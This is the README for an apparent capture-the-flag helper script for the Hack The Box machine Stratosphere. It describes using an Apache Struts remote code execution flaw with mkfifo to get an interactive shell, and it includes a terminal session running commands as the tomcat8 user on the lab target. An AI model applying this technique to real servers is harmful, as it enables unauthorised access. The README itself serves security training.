## Challenge

[Stratosphere](https://www.hackthebox.eu/home/machines/profile/129) from Hackthebox.eu

## Description

Website on Stratosphere has RCE via Apache Struts. I'll take advantage of `mkfifo` to create a full tty shell using this script.

## Reference

Originally published in blog posts: https://0xdf.gitlab.io/2018/09/01/htb-stratosphere.html#building-a-shell

Inspiration from https://www.youtube.com/watch?v=k6ri-LFWEj4

## Usage

```
root@kali:~/hackthebox/stratosphere-10.10.10.64# python3 ./stratosphere_shell.py
[*] Session ID: 17370
[*] Setting up fifo shell on target
[*] Setting up read thread
stratosphere> pwd
/var/lib/tomcat8

stratosphere>

ls
conf
db_connect
lib
logs
policy
webapps
work

stratosphere> cd ..
stratosphere> pwd
/var/lib

stratosphere> upgrade
tomcat8@stratosphere:/var/lib$
pwd
pwd
/var/lib
tomcat8@stratosphere:/var/lib$
```
